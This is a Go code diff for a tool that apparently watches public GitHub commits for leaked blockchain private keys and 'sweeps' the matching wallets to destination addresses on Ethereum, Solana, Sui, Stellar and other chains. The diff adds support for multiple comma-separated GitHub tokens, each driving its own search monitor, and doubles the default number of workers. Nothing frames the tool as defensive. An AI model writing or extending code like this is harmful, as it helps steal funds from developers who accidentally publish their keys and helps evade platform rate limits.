@@ -13,6 +13,7 @@ import (
 	"net/http"
 	"os"
 	"os/signal"
+	"strings"
 	"syscall"
 	"time"
 )
@@ -43,7 +44,7 @@ func main() {
 	cfg := &Config{}
 
 	flag.StringVar(&cfg.GitHubToken, "github-token", os.Getenv("GITHUB_TOKEN"),
-		"GitHub personal access token (or set GITHUB_TOKEN env)")
+		"GitHub personal access token(s) — comma-separated for multiple (or set GITHUB_TOKEN env)")
 	flag.StringVar(&cfg.ETHNodeURL, "eth-rpc", os.Getenv("ETH_RPC_URL"),
 		"Ethereum JSON-RPC endpoint (default: Cloudflare public node)")
 	flag.StringVar(&cfg.SolanaNodeURL, "sol-rpc", os.Getenv("SOL_RPC_URL"),
@@ -70,7 +71,7 @@ func main() {
 		"Destination Sui address for sweeping")
 	flag.StringVar(&cfg.DestXLM, "dest-xlm", os.Getenv("DEST_XLM"),
 		"Destination Stellar address for sweeping")
-	flag.IntVar(&cfg.Workers, "workers", 4,
+	flag.IntVar(&cfg.Workers, "workers", 8,
 		"Number of parallel commit-diff processing workers")
 	flag.BoolVar(&cfg.VerifyOnline, "verify-online", false,
 		"Call online verify functions in the blockchain detector (slower)")
@@ -207,10 +208,25 @@ func run(cfg *Config) error {
 	}
 
 	monitor := NewGitHubMonitor(cfg.GitHubToken)
-	searchMon := NewSearchMonitor(cfg.GitHubToken)
+
+	tokens := strings.Split(cfg.GitHubToken, ",")
+	// Trim spaces and filter empty tokens.
+	var activeTokens []string
+	for _, t := range tokens {
+		t = strings.TrimSpace(t)
+		if t != "" {
+			activeTokens = append(activeTokens, t)
+		}
+	}
+	if len(activeTokens) == 0 {
+		activeTokens = []string{""}
+	}
 
 	go monitor.Run(ctx, commitJobs)
-	go searchMon.Run(ctx, commitJobs)
+	for _, t := range activeTokens {
+		sm := NewSearchMonitor(t)
+		go sm.Run(ctx, commitJobs)
+	}
 
 	for i := 0; i < cfg.Workers; i++ {
 		go commitWorker(ctx, monitor, commitJobs, foundKeys, cfg.VerifyOnline)
